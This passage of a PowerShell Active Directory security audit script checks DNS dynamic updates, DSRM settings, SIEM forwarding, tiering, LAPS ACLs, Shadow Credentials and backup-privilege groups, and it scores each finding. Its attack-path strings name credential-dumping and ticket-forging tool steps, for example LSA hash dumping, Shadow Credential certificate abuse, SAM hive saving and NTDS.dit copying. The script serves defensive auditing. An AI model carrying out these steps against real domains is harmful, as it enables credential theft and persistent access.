            "$($insecureDynamic.Count) zone(s) accept unauthenticated dynamic DNS updates -- any host can register arbitrary DNS records (DNS hijacking, ADIDNS poisoning)" `
            -Resources ($insecureDynamic.ZoneName) `
            -AttackPath "Powermad New-ADIDNSNode -> register wildcard DNS record -> all hosts resolve to attacker -> NTLM relay or credential harvest" `
            -Fix "Set-DnsServerPrimaryZone -Name ZONE -DynamicUpdate Secure" `
            -MITRE "T1557" -Pts 0 -Max 3
    }
}

# 19.3 Wildcard DNS records (ADIDNS poisoning indicator)
$wildcardRecords = @()
try {
    $wildcardRecords = @(Get-DnsServerResourceRecord -ZoneName $domFQDN -Name "*" -RRType A -ErrorAction SilentlyContinue)
} catch {}
if ($wildcardRecords.Count -gt 0) {
    Add-Finding "DNSSecurity" "Wildcard DNS Record Present" "Critical" `
        "Wildcard DNS record (*.$domFQDN) exists -- ALL non-existent hostnames resolve to this IP. Attacker may have poisoned DNS." `
        -Resources ($wildcardRecords | ForEach-Object { "$($_.Name) -> $($_.RecordData.IPv4Address)" }) `
        -AttackPath "Wildcard record -> all typo/new hostnames resolve to attacker IP -> NTLM relay, credential harvest at scale" `
        -Fix "Remove-DnsServerResourceRecord -ZoneName $domFQDN -Name '*' -RRType A. Investigate who created it." `
        -MITRE "T1557" -Pts 0 -Max 5
    Write-Host "  [!] Wildcard DNS record found -- potential ADIDNS poisoning" -ForegroundColor Red
} else {
    Add-Finding "DNSSecurity" "No Wildcard DNS Records" "Good" "No wildcard DNS records in domain zone" -Pts 5 -Max 5
}

# ===============================================================================
# DOMAIN 20 -- DSRM & SENSITIVE RIGHTS
# ===============================================================================
Write-Section "20. DSRM & USER RIGHTS ASSIGNMENT"

# 20.1 DSRM admin logon behavior
$dsrmBehavior = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" "DSRMAdminLogonBehavior"
if ($dsrmBehavior -eq 0 -or $null -eq $dsrmBehavior) {
    Add-Finding "SensitiveRights" "DSRM Admin Logon Behavior" "Good" "DSRM admin account can only logon in DSRM mode (value=0 -- safe)" -Pts 3 -Max 3
} elseif ($dsrmBehavior -eq 2) {
    Add-Finding "SensitiveRights" "DSRM Admin Always Allowed" "Critical" `
        "DSRMAdminLogonBehavior=2 -- DSRM admin account can logon at any time (not just DSRM mode). If DSRM password is known, attacker has persistent backdoor local admin on ALL DCs." `
        -AttackPath "Cred-Dump-Tool lsa-dump::lsa /patch -> dump DSRM hash -> Pass-Hash to any DC as local admin (DSRM account) -> persistent backdoor even after all DA passwords reset" `
        -Fix "Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name DSRMAdminLogonBehavior -Value 0" `
        -MITRE "T1078.001" -Pts 0 -Max 3
    Write-Host "  [!] DSRM logon allowed outside recovery mode -- backdoor risk" -ForegroundColor Red
} else {
    Add-Finding "SensitiveRights" "DSRM Admin Logon Behavior" "Medium" "DSRMAdminLogonBehavior=$dsrmBehavior -- verify this is expected. Set to 0 for maximum security." `
        -Fix "Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name DSRMAdminLogonBehavior -Value 0" -Pts 1 -Max 3
}

# 20.2 DSRM password age
$dsrmPasswordAge = "Unknown"
try {
    $dsrmPwdSet = Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4794 } -MaxEvents 1 -ErrorAction SilentlyContinue
    if ($dsrmPwdSet) {
        $dsrmPasswordAge = "$([math]::Round(((Get-Date)-$dsrmPwdSet.TimeCreated).Days / 30)) months ago"
        if (((Get-Date)-$dsrmPwdSet.TimeCreated).Days -gt 365) {
            Add-Finding "SensitiveRights" "DSRM Password Not Rotated" "High" `
                "DSRM password last changed $dsrmPasswordAge -- rotate at least annually. Use unique DSRM password per DC." `
                -Fix "ntdsutil 'set dsrm password' 'reset password on server DC_NAME' quit quit" `
                -MITRE "T1078.001" -Pts 0 -Max 2
        }
    }
} catch {}

# 20.3 SeDebugPrivilege on DCs -- who can debug DC processes (= LSA-SS dump)
if ($isDC) {
    $seDebug = (secedit /export /cfg "$env:TEMP\secedit_export.inf" /quiet 2>$null)
    $seDebugContent = Get-Content "$env:TEMP\secedit_export.inf" -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\secedit_export.inf" -ErrorAction SilentlyContinue
    $seDebugLine = @($seDebugContent | Where-Object { $_ -match 'SeDebugPrivilege' })
    if ($seDebugLine -and $seDebugLine -match '\*S-1-5-32-544') {
        Add-Finding "SensitiveRights" "SeDebugPrivilege -- Admins Only" "Good" "SeDebugPrivilege restricted to Administrators on this DC" -Pts 3 -Max 3
    } elseif ($seDebugLine) {
        Add-Finding "SensitiveRights" "SeDebugPrivilege -- Non-Admin Holders" "Critical" `
            "SeDebugPrivilege assigned to non-standard principals: $seDebugLine -- holders can open any process including LSA-SS for memory read" `
            -Fix "GPO: Computer Config -> Windows Settings -> Security Settings -> User Rights Assignment -> Debug programs -> restrict to Administrators only" `
            -MITRE "T1003.001" -Pts 0 -Max 3
    }
}

# 20.4 Schema Admins -- should be empty
$schemaAdmins = @(Get-ADGroupMember "Schema Admins" @dcParam -Recursive -ErrorAction SilentlyContinue |
    Where-Object { $_.SamAccountName -ne 'Administrator' })
if ($schemaAdmins.Count -eq 0) {
    Add-Finding "SensitiveRights" "Schema Admins Empty" "Good" "Schema Admins group is empty (only built-in Administrator if any)" -Pts 3 -Max 3
} else {
    Add-Finding "SensitiveRights" "Schema Admins Not Empty" "High" `
        "$($schemaAdmins.Count) non-default account(s) in Schema Admins -- Schema Admins can modify AD schema, potentially creating persistence or privilege escalation attributes" `
        -Resources ($schemaAdmins.SamAccountName) `
        -Fix "Remove all accounts from Schema Admins. Add temporarily only during schema modifications, then remove immediately." `
        -MITRE "T1078.002" -Pts 0 -Max 3
}

# ===============================================================================
# DOMAIN 21 -- WINDOWS EVENT FORWARDING & SIEM
# ===============================================================================
Write-Section "21. WINDOWS EVENT FORWARDING & SIEM"

# 21.1 WEF subscriptions
$wecSvc = Get-Service Wecsvc -ErrorAction SilentlyContinue
$wefSubs = 0
try { $wefSubs = (wecutil es 2>$null | Measure-Object -Line).Lines } catch {}

if ($wecSvc -and $wecSvc.Status -eq 'Running' -and $wefSubs -gt 0) {
    Add-Finding "SIEMForwarding" "WEF/WEC Active" "Good" "Windows Event Collector running with $wefSubs subscription(s) -- events forwarded to SIEM" -Pts 4 -Max 4
} elseif ($wecSvc -and $wecSvc.Status -eq 'Running') {
    Add-Finding "SIEMForwarding" "WEF Running -- No Subscriptions" "High" `
        "WEC service running but 0 subscriptions -- no events being collected. SIEM is blind." `
        -Fix "Create subscriptions: wecutil cs SUBSCRIPTION.xml or use Group Policy WEF configuration. Target at minimum: Security events from all DCs." `
        -MITRE "T1562.008" -Pts 1 -Max 4
} else {
    Add-Finding "SIEMForwarding" "WEF Not Configured" "High" `
        "Windows Event Forwarding not configured -- DC security events NOT forwarded to central SIEM. All alerting relies on agents being present and unmodified on each host." `
        -Fix "Deploy WEF: configure WinRM, create WEC subscriptions for Security+Sysmon+PS events from all DCs. NSA WEF paper has baseline subscription XML." `
        -MITRE "T1562.008" -Pts 0 -Max 4
}

# 21.2 Critical Event ID coverage -- check if audit categories generate expected events
$criticalEventIDs = @{
    4719 = "Audit policy changed -- attacker disabling logging"
    4765 = "SID History added to account -- privilege escalation persistence"
    4766 = "SID History add attempt failed"
    4794 = "DSRM password set -- backdoor creation"
    4964 = "Special group logon -- sensitive group member logged on"
    5136 = "AD object attribute modified -- ACL/delegation changes"
    5137 = "AD object created -- new accounts/GPOs/objects"
    5141 = "AD object deleted"
    4768 = "Kerberos TGT requested -- AS-REQ (AS-REP roasting baseline)"
    4769 = "Kerberos service ticket requested -- Kerb-roasting detection"
    4776 = "NTLM authentication -- relay attack baseline"
    4662 = "Object access with permissions -- DCSync detection"
}

$secLog2 = Get-WinEvent -ListLog Security -ErrorAction SilentlyContinue
Add-Finding "SIEMForwarding" "Critical Event ID Reference" "Info" `
    "Verify these critical event IDs flow to SIEM: 4662 (DCSync), 4719 (audit change), 4765/4766 (SIDHistory), 4794 (DSRM), 4964 (special group logon), 5136/5137/5141 (AD changes), 4769 RC4 (Kerb-roast), 4768 PREAUTH-FAIL (AS-REP)"

# 21.3 SIEM agent check (cross-reference Phase 1 data)
$siemSvcs = @{ "SplunkForwarder"="Splunk"; "HealthService"="Azure Monitor/Sentinel"; "AzureMonitorAgent"="AMA"; "winlogbeat"="Elastic" }
$foundSIEM = $false
foreach ($s in $siemSvcs.Keys) {
    $svc = Get-Service -Name $s -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -eq 'Running') {
        Add-Finding "SIEMForwarding" "SIEM Agent Active" "Good" "$($siemSvcs[$s]) agent running on this host -- events being forwarded" -Pts 3 -Max 3
        $foundSIEM = $true
        break
    }
}
if (-not $foundSIEM) {
    Add-Finding "SIEMForwarding" "No SIEM Agent Detected" "High" `
        "No SIEM forwarding agent found on this host -- security events may not reach your SIEM" `
        -Fix "Install appropriate agent: Splunk UF, AMA (Azure Monitor Agent), Elastic Agent, or configure WEF to WEC collector." `
        -MITRE "T1562.008" -Pts 0 -Max 3
}

# ===============================================================================
# DOMAIN 22 -- TIER VIOLATION & ADMIN LOGON HYGIENE
# ===============================================================================
Write-Section "22. TIER VIOLATION & ADMIN LOGON HYGIENE"

# 22.1 DA accounts with interactive logons to non-DC workstations
# Check recent 4624 Type 2/10 logons for DA accounts on non-DC machines
$daUsers =@( @($allPrivMembers["Domain Admins"]) | Where-Object { $_.objectClass -eq 'user' })
$tierViolations = @()
if ($isDC) {
    foreach ($da in ($daUsers | Select-Object -First 10)) {
        try {
            $recentLogons = Get-WinEvent -FilterHashtable @{
                LogName='Security'; Id=4624
                StartTime=(Get-Date).AddDays(-30)
            } -MaxEvents 1000 -ErrorAction SilentlyContinue |
            Where-Object {
                $_.Properties[5].Value -eq $da.SamAccountName -and
                $_.Properties[8].Value -in @(2,10) -and  # Interactive / RemoteInteractive
                $_.Properties[11].Value -notmatch 'DC|DOMAIN CONTROLLER'
            }
            if (@($recentLogons).Count -gt 0) {
                $workstations =@( @($recentLogons) | ForEach-Object { $_.Properties[11].Value } | Select-Object -Unique)
                $tierViolations += "$($da.SamAccountName) -> $($workstations -join ', ')"
            }
        } catch {}
    }
}
if ($tierViolations.Count -eq 0) {
    Add-Finding "TierHygiene" "DA Tier Violation Logons" "Good" "No DA interactive logons to non-DC workstations detected in last 30 days" -Pts 5 -Max 5
} else {
    Add-Finding "TierHygiene" "DA Tier Violation -- Workstation Logon" "Critical" `
        "$($tierViolations.Count) Domain Admin account(s) logged on interactively to workstations -- DA credentials cached on endpoints vulnerable to LSA-SS dump" `
        -Resources $tierViolations `
        -AttackPath "User-level endpoint compromise -> LSA-SS dump -> DA credentials (Credential Guard not deployed there) -> lateral movement to DC" `
        -Fix "Enforce PAW: DAs may ONLY logon to Tier 0 systems (DCs, PAW hosts). Use GPO 'Deny log on locally' and 'Deny log on through Remote Desktop Services' for DA on workstations." `
        -MITRE "T1078.002" -Pts 0 -Max 5
    Write-Host "  [!] Tier violations found: $($tierViolations -join '; ')" -ForegroundColor Red
}

# 22.2 LAPS ACL -- who can read LAPS passwords (ms-MCS-AdmPwd)
$lapsACLRisks = @()
try {
    $computers =@( @(Get-ADComputer -Filter * @dcParam -Properties 'ms-MCS-AdmPwd' | Select-Object -First 5))
    foreach ($comp in $computers) {
        $acl = Get-Acl "AD:\$($comp.DistinguishedName)" -ErrorAction SilentlyContinue
        $lapsReaders =@( @($acl.Access) | Where-Object {
            $_.ObjectType.ToString() -eq 'ms-mcs-admpwd' -and
            $_.ActiveDirectoryRights -match 'ReadProperty' -and
            $_.IdentityReference -notmatch 'Domain Admins|SYSTEM|Administrators|SELF'
        })
        if ($lapsReaders) { $lapsACLRisks += "$($comp.Name): $($lapsReaders.IdentityReference.Value -join ', ')" }
    }
} catch {}

if ($lapsACLRisks.Count -eq 0) {
    Add-Finding "TierHygiene" "LAPS ACL -- Read Restriction" "Good" "LAPS ms-MCS-AdmPwd attribute not readable by non-admins" -Pts 4 -Max 4
} else {
    Add-Finding "TierHygiene" "LAPS Password Over-Permissioned" "High" `
        "Non-admin principals can read LAPS passwords: $($lapsACLRisks -join ' | ')" `
        -Resources $lapsACLRisks `
        -AttackPath "Read ms-MCS-AdmPwd attribute -> local admin password for target computer -> lateral movement to endpoint -> LSA-SS dump" `
        -Fix "Review and restrict LAPS attribute ACL using Set-AdmPwdReadPasswordPermission. Only Tier 0 admins and helpdesk should read specific OUs." `
        -MITRE "T1552.001" -Pts 0 -Max 4
}

# 22.3 Default computer container (CN=Computers) -- unmanaged machines land here
$defaultCompOU = "CN=Computers,$domainDN"
$defaultCompCount = @(Get-ADComputer -SearchBase $defaultCompOU -Filter * @dcParam -ErrorAction SilentlyContinue).Count
if ($defaultCompCount -eq 0) {
    Add-Finding "TierHygiene" "Default Computer Container Empty" "Good" "No computers in default CN=Computers container -- all machines in managed OUs with GPOs applied" -Pts 2 -Max 2
} else {
    Add-Finding "TierHygiene" "Computers in Default Container" "Medium" `
        "$defaultCompCount computer(s) in CN=Computers -- these receive minimal/no GPO. No LAPS, no Sysmon, no AppLocker enforced via OU GPO." `
        -Fix "Move computers to correct OUs: Move-ADObject -Identity COMP_DN -TargetPath 'OU=Workstations,DC=corp,DC=local'. Set default redirect: redircmp 'OU=NewComputers,$domainDN'" `
        -Pts 0 -Max 2
}

# ===============================================================================
# DOMAIN 23 -- SHADOW CREDENTIALS & CERTIFICATE-BASED AUTH ABUSE
# ===============================================================================
Write-Section "23. SHADOW CREDENTIALS & CERTIFICATE-BASED AUTH ABUSE"

# 23.1 Accounts with msDS-KeyCredentialLink populated (Shadow Credentials)
# Any account that has a value here can be used for PKINIT auth -- should only be set by WHfB enrollment
$shadowCredAccounts = @()
try {
    $shadowUsers = Get-ADUser -Filter * @dcParam `
        -Properties 'msDS-KeyCredentialLink', PasswordLastSet -ErrorAction SilentlyContinue |
        Where-Object { $_.'msDS-KeyCredentialLink' -and $_.'msDS-KeyCredentialLink'.Count -gt 0 }
    $shadowComputers = Get-ADComputer -Filter * @dcParam `
        -Properties 'msDS-KeyCredentialLink' -ErrorAction SilentlyContinue |
        Where-Object { $_.'msDS-KeyCredentialLink' -and $_.'msDS-KeyCredentialLink'.Count -gt 0 }
    $shadowCredAccounts = @($shadowUsers | ForEach-Object { "USER:$($_.SamAccountName)[$($_.'msDS-KeyCredentialLink'.Count) key(s)]" }) +
                          @($shadowComputers | ForEach-Object { "COMPUTER:$($_.Name)[$($_.'msDS-KeyCredentialLink'.Count) key(s)]" })
} catch {}

if ($shadowCredAccounts.Count -eq 0) {
    Add-Finding "ShadowCreds" "msDS-KeyCredentialLink Population" "Good" "No unexpected msDS-KeyCredentialLink values found -- Shadow Credential attack surface minimal" -Pts 5 -Max 5
} else {
    Add-Finding "ShadowCreds" "Shadow Credentials (msDS-KeyCredentialLink)" "High" `
        "$($shadowCredAccounts.Count) object(s) have msDS-KeyCredentialLink set. If set by attackers, this allows persistent PKINIT authentication bypassing password." `
        -Resources $shadowCredAccounts `
        -AttackPath "GenericWrite on victim account -> set msDS-KeyCredentialLink to attacker's certificate -> PKINIT with that cert -> get TGT as victim without knowing password. Persists through password resets." `
        -Fix "Audit with: Get-ADObject -Filter {msDS-KeyCredentialLink -like '*'} -Properties msDS-KeyCredentialLink. Remove unexpected entries. Enable audit on msDS-KeyCredentialLink attribute writes (4662 with attribute GUID)." `
        -MITRE "T1556.006" -CIS "5.7" -Pts 0 -Max 5
    Write-Host "  [!] Shadow credential candidates: $($shadowCredAccounts -join ' | ')" -ForegroundColor Red
}

# 23.2 Write access to msDS-KeyCredentialLink -- Shadow Credentials attack surface
# -----------------------------------------------------------------------------
# The msDS-KeyCredentialLink attribute stores FIDO2 / WHfB public key credentials.
# An attacker with WriteProperty or GenericWrite on a target account can add their
# own public key -> authenticate via PKINIT as the target indefinitely, surviving
# password resets and not triggering password-change events.
#
# Scope: checks users (AdminCount=1 + krbtgt) AND high-value computer objects
#        (DCs, tier-0 servers). Removed the $isDC gate -- this check is meaningful
#        from any domain-joined host with read access to AD DACLs.
#
# Attribute GUID (stable):  5b47d60f-6090-40b2-9f37-2a4de88f3063
# MITRE T1556.006 -- Modify Authentication Process: Multi-Factor Authentication
# -----------------------------------------------------------------------------

$KCL_ATTR_GUID = [guid]'5b47d60f-6090-40b2-9f37-2a4de88f3063'   # msDS-KeyCredentialLink

# Rights that allow writing msDS-KeyCredentialLink
$writeRightsMask = [System.DirectoryServices.ActiveDirectoryRights]'WriteProperty' -bor
                   [System.DirectoryServices.ActiveDirectoryRights]'GenericWrite'   -bor
                   [System.DirectoryServices.ActiveDirectoryRights]'GenericAll'

# Authorised principals -- WHfB enrollment service and admins
$authorisedShadowPattern = 'Domain Admins|Enterprise Admins|SYSTEM|Administrators|' +
                           'Key Admins|Enterprise Key Admins|Window Manager|NT AUTHORITY'

$shadowWriteRisks = [System.Collections.Generic.List[PSCustomObject]]::new()

try {
    # -- Build target list: privileged users ---------------------------------
    $highValueDNs = [System.Collections.Generic.List[string]]::new()

    try {
        $privUsers = @(
            Get-ADUser -Filter { SamAccountName -eq 'krbtgt' } @dcParam -ErrorAction Stop
            Get-ADUser -Filter { AdminCount -eq 1 -and Enabled -eq $true } @dcParam `
                       -ErrorAction Stop | Select-Object -First 20
        ) | Where-Object { $_ }
        $privUsers | ForEach-Object { $highValueDNs.Add($_.DistinguishedName) }
    }
    catch [System.UnauthorizedAccessException] {
        Write-AuditWarning "Shadow Creds -- privileged user list (23.2)" `
            "Access Denied enumerating AdminCount=1 accounts" "ShadowCreds"
    }
    catch { Write-Host "  [DBG] AdminCount users: $($_.Exception.Message)" -ForegroundColor DarkGray }

    # -- Build target list: high-value computers (DCs + tier-0 indicators) ---
    try {
        $dcObjects = Get-ADComputer -Filter { PrimaryGroupID -eq 516 -or PrimaryGroupID -eq 521 } `
                                    @dcParam -ErrorAction Stop    # 516=DC, 521=RODC
        $dcObjects | ForEach-Object { $highValueDNs.Add($_.DistinguishedName) }
    }
    catch [System.UnauthorizedAccessException] {
        Write-AuditWarning "Shadow Creds -- DC computer objects (23.2)" `
            "Access Denied enumerating Domain Controller accounts" "ShadowCreds"
    }
    catch { Write-Host "  [DBG] DC objects: $($_.Exception.Message)" -ForegroundColor DarkGray }

    # Deduplicate
    $highValueDNs = @($highValueDNs | Sort-Object -Unique)

    Write-Host "  [*] Shadow Creds write-ACL: scanning $($highValueDNs.Count) high-value objects..." -ForegroundColor DarkGray

    # -- ACL walk -------------------------------------------------------------
    foreach ($dn in $highValueDNs) {
        try {
            $acl = Get-Acl "AD:\$dn" -ErrorAction Stop

            foreach ($ace in $acl.Access) {
                if ($ace.AccessControlType -ne 'Allow') { continue }
                if ($ace.IdentityReference.Value -match $authorisedShadowPattern) { continue }

                $rights = $ace.ActiveDirectoryRights

                # Check 1: WriteProperty scoped to msDS-KeyCredentialLink GUID
                $isKCLSpecificWrite = ($rights -band 'WriteProperty') -and
                                      ($ace.ObjectType -eq $KCL_ATTR_GUID)

                # Check 2: GenericWrite / GenericAll -- implicitly allows all attribute writes
                $isBroadWrite = ($rights -band 'GenericWrite') -or
                                ($rights -band 'GenericAll')   -or
                                ($rights -band 'WriteDacl')    -or   # can grant self WriteProperty
                                ($rights -band 'WriteOwner')          # can take ownership -> full control

                if (-not ($isKCLSpecificWrite -or $isBroadWrite)) { continue }

                $writeType = if ($isKCLSpecificWrite -and -not $isBroadWrite) {
                    'Direct msDS-KeyCredentialLink write (specific attribute ACE)'
                } elseif ($rights -band 'GenericAll') {
                    'GenericAll -- full control, implicitly includes msDS-KeyCredentialLink write'
                } elseif ($rights -band 'GenericWrite') {
                    'GenericWrite -- all property writes including msDS-KeyCredentialLink'
                } elseif ($rights -band 'WriteDacl') {
                    'WriteDACL -- can grant self WriteProperty on msDS-KeyCredentialLink'
                } elseif ($rights -band 'WriteOwner') {
                    'WriteOwner -- can take ownership then grant full control'
                } else { 'WriteProperty on msDS-KeyCredentialLink' }

                # Resolve target object name
                $targetName = try {
                    $dn -replace '^CN=([^,]+).*','$1'
                } catch { $dn }

                $shadowWriteRisks.Add([PSCustomObject]@{
                    TargetDN    = $dn
                    TargetName  = $targetName
                    Principal   = $ace.IdentityReference.Value
                    WriteType   = $writeType
                    Rights      = $rights.ToString()
                    IsKCLDirect = $isKCLSpecificWrite
                })
            }
        }
        catch [System.UnauthorizedAccessException] {
            Write-Host "  [DBG] ACL read denied for '$dn' -- skipping" -ForegroundColor DarkGray
        }
        catch {
            Write-Host "  [DBG] ACL error '$dn': $($_.Exception.Message)" -ForegroundColor DarkGray
        }
    }
}
catch [System.UnauthorizedAccessException] {
    Write-AuditWarning "Shadow Credentials Write ACL (23.2)" `
        "Access Denied -- DACL enumeration on high-value objects requires Domain Admin or explicit DACL-read delegation. Check is INCOMPLETE." `
        "ShadowCreds"
}
catch {
    Write-AuditWarning "Shadow Credentials Write ACL (23.2)" $_.Exception.Message "ShadowCreds"
}
finally {
    Remove-Variable -Name KCL_ATTR_GUID, writeRightsMask -ErrorAction SilentlyContinue
}

if ($shadowWriteRisks.Count -eq 0) {
    Add-Finding "ShadowCreds" "Key Credential Write ACL" "Good" `
        "No unauthorised principals have WriteProperty / GenericWrite on msDS-KeyCredentialLink for high-value accounts or DCs" `
        -Pts 4 -Max 4
}
else {
    # Separate direct KCL writes from broad-right risks
    $directKCL =@( @($shadowWriteRisks | Where-Object { $_.IsKCLDirect }))
    $broadRight =@( @($shadowWriteRisks | Where-Object { -not $_.IsKCLDirect }))

    # Per-object remediation commands
    $remediationLines = @($shadowWriteRisks | Sort-Object TargetDN -Unique | ForEach-Object {
        $r = $_
        @"
# Strip Shadow Credential write from '$($r.Principal)' on '$($r.TargetName)'
`$acl     = Get-Acl 'AD:\$($r.TargetDN)'
`$kclGuid = [guid]'5b47d60f-6090-40b2-9f37-2a4de88f3063'
`$acl.Access | Where-Object {
    `$_.IdentityReference.Value -like '*$($r.Principal.Split('\')[-1])*' -and
    (`$_.ObjectType -eq `$kclGuid -or
     `$_.ActiveDirectoryRights -band 'GenericWrite,GenericAll,WriteDacl,WriteOwner')
} | ForEach-Object { `$acl.RemoveAccessRule(`$_) | Out-Null }
Set-Acl 'AD:\$($r.TargetDN)' `$acl
Write-Host "Removed Shadow Creds write from $($r.Principal) on $($r.TargetName)"
"@
    })

    $severity = if ($directKCL.Count -gt 0 -or
                    ($shadowWriteRisks | Where-Object { $_.Rights -match 'GenericAll' }).Count -gt 0) {
        'Critical'
    } else { 'High' }

    Add-Finding "ShadowCreds" "Shadow Credentials -- Unauthorised msDS-KeyCredentialLink Write Access" $severity `
        "$($shadowWriteRisks.Count) write ACE(s) on high-value accounts/DCs allow non-admin principals to set msDS-KeyCredentialLink. Attacker adds their certificate -> PKINIT auth as victim indefinitely, surviving password resets." `
        -Resources ($shadowWriteRisks | ForEach-Object {
            "Target:$($_.TargetName) | Principal:$($_.Principal) | Type:$($_.WriteType)"
        }) `
        -AttackPath "$($script:T.WK).exe add /target:$($shadowWriteRisks[0].TargetName) -> adds attacker cert to msDS-KeyCredentialLink -> $($script:T.RB) asktgt /user:TARGET /certificate:... /password:... -> TGT as TARGET. Does NOT require knowing current password. Persists through all password changes." `
        -Fix ($remediationLines -join "`n`n") `
        -MITRE "T1556.006" -CIS "5.7" -Pts 0 -Max 4

    Write-Host "  [!] Shadow Creds write risks ($($shadowWriteRisks.Count) ACEs):" -ForegroundColor Red
    $shadowWriteRisks | ForEach-Object {
        Write-Host "      $($_.TargetName) <- $($_.Principal) [$($_.WriteType)]" -ForegroundColor DarkYellow
    }
}

# 23.3 WHfB (Windows Hello for Business) key trust vs certificate trust
# Certificate trust WHfB uses ADCS -- if ADCS is misconfigured, WHfB can be exploited
$whfbCertTrust = $false
try {
    $ngcPolicy = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Name "RequireCertificateForOnPremAuth" -ErrorAction SilentlyContinue
    $whfbCertTrust = $ngcPolicy.RequireCertificateForOnPremAuth -eq 1
    Add-Finding "ShadowCreds" "WHfB Deployment Mode" "Info" `
        "Windows Hello for Business: $(if($whfbCertTrust){'Certificate trust (ADCS-backed -- ensure ESC controls applied)'}else{'Key trust or not enforced via GPO on this host'})" `
        -Pts 2 -Max 2
} catch {
    Add-Finding "ShadowCreds" "WHfB Policy" "Info" "WHfB policy not detectable on this host -- verify via GPO console" -Pts 1 -Max 2
}

# 23.4 ADCS ESC9 / ESC10 -- No security extension / weak mapping
# ESC9: Certificate template has CT_FLAG_NO_SECURITY_EXTENSION -- certificate not bound to security identifier
# ESC10: Domain Controller using weak certificate mapping (AllowWeakCertificateBindingEnforcement)
$dcCertWeakMap = $null
try {
    $dcCertWeakMap = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" "StrongCertificateBindingEnforcement"
} catch {}

if ($null -eq $dcCertWeakMap -or $dcCertWeakMap -eq 0) {
    Add-Finding "ShadowCreds" "ADCS ESC10 -- Weak Certificate Binding (KDC)" "High" `
        "StrongCertificateBindingEnforcement not set to 2 (value: $(if($null -eq $dcCertWeakMap){'NOT SET (default=1)'}else{$dcCertWeakMap})). DC accepts certificates without strong SID binding -- ESC10 attack possible." `
        -AttackPath "Compromise account with GenericWrite -> shadow credential or certificate enrollment -> forge certificate with SAN -> DC accepts it and issues TGT. MS KB5014754 introduced strong binding." `
        -Fix "Set HKLM:\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement = 2. Note: requires certificate re-issuance if WHfB in use. Full enforcement mode from Nov 2024." `
        -MITRE "T1649" -CIS "18.9.48" -Pts 0 -Max 4
} else {
    Add-Finding "ShadowCreds" "ADCS ESC10 -- Strong Certificate Binding (KDC)" "Good" `
        "StrongCertificateBindingEnforcement = $dcCertWeakMap (strong binding enforced)" -Pts 4 -Max 4
}

# ===============================================================================
# DOMAIN 24 -- OBJECT OWNERSHIP & BACKUP PRIVILEGE ABUSE
# ===============================================================================
Write-Section "24. OBJECT OWNERSHIP & BACKUP PRIVILEGE ABUSE"

# 24.1 Ownership of critical AD objects (krbtgt, Domain Admins, domain root, AdminSDHolder)
$ownershipRisks = @()
if ($isDC) {
    $critObjects = @{
        "Domain Root"     = $domainDN
        "AdminSDHolder"   = "CN=AdminSDHolder,CN=System,$domainDN"
        "krbtgt"          = "CN=krbtgt,CN=Users,$domainDN"
        "Domain Admins"   = "CN=Domain Admins,CN=Users,$domainDN"
        "Enterprise Admins" = "CN=Enterprise Admins,CN=Users,$domainDN"
    }
    $safeOwners = @('Domain Admins','Enterprise Admins','SYSTEM','Administrators','Schema Admins')
    foreach ($objName in $critObjects.Keys) {
        try {
            $acl = Get-Acl "AD:\$($critObjects[$objName])" -ErrorAction SilentlyContinue
            if ($acl) {
                $owner = $acl.Owner
                $ownerSafe = @($safeOwners | Where-Object { $owner -match $_ })
                if (-not $ownerSafe) {
                    $ownershipRisks += "$objName owned by: $owner"
                    Add-Finding "ObjOwnership" "Non-Standard Owner -- $objName" "Critical" `
                        "'$objName' is owned by '$owner' (not Domain Admins/SYSTEM). Owner can take WriteOwner/WriteDACL at any time -> full object control." `
                        -AttackPath "Object owner can grant themselves any right including WriteDACL -> add GenericAll ACE -> control the object (modify group membership, reset password, add SID-History, etc.)" `
                        -Fix "Set-ADObject '$($critObjects[$objName])' -Replace @{nTSecurityDescriptor=...} or use ADUC Security -> Advanced -> Owner -> change to 'Domain Admins'" `
                        -MITRE "T1222.001" -Pts 0 -Max 3
                } else {
                    Add-Finding "ObjOwnership" "Object Owner OK -- $objName" "Good" "Owner: $owner" -Pts 3 -Max 3
                }
            }
        } catch {}
    }
}

# 24.2 Backup Operators group membership -- SeBackupPrivilege = NTDS.dit dump
$backupOps = @()
try {
    $backupOps = @(Get-ADGroupMember "Backup Operators" @dcParam -Recursive -ErrorAction SilentlyContinue |
        Where-Object { $_.objectClass -eq 'user' })
} catch {}

if ($backupOps.Count -eq 0) {
    Add-Finding "ObjOwnership" "Backup Operators Group Empty" "Good" "Backup Operators group has no user members -- SeBackupPrivilege not exploitable via group membership" -Pts 5 -Max 5
} else {
    Add-Finding "ObjOwnership" "Backup Operators -- Privilege Escalation Risk" "Critical" `
        "$($backupOps.Count) user(s) in Backup Operators: $($backupOps.SamAccountName -join ', '). SeBackupPrivilege allows reading any file including NTDS.dit via shadow copy -- full domain hash dump without DA." `
        -Resources ($backupOps | ForEach-Object { $_.SamAccountName }) `
        -AttackPath "Backup Operator -> reg save HKLM\SAM + SYSTEM -> or diskshadow/robocopy to copy NTDS.dit + SYSTEM hive -> secrets-dump.py -> all domain hashes. Equivalent to DCSync from a backup server." `
        -Fix "Empty Backup Operators on DCs -- use dedicated backup service accounts with only the permissions required. Apply tiering: backup accounts must be Tier 0 and excluded from regular use." `
        -MITRE "T1003.003" -CIS "2.2.4" -Pts 0 -Max 5
    Write-Host "  [!] Backup Operators with users: $($backupOps.SamAccountName -join ', ')" -ForegroundColor Red
}

# 24.3 Account Operators group -- can modify most user accounts and add to non-protected groups
$accountOps = @()
try {
    $accountOps = @(Get-ADGroupMember "Account Operators" @dcParam -Recursive -ErrorAction SilentlyContinue |
        Where-Object { $_.objectClass -eq 'user' })
} catch {}

if ($accountOps.Count -eq 0) {
    Add-Finding "ObjOwnership" "Account Operators Group Empty" "Good" "Account Operators group has no user members" -Pts 3 -Max 3
} else {
    Add-Finding "ObjOwnership" "Account Operators -- Lateral Movement Risk" "High" `
        "$($accountOps.Count) user(s) in Account Operators: $($accountOps.SamAccountName -join ', '). Members can add users to Server Operators / Print Operators / Backup Operators -- privilege escalation path." `
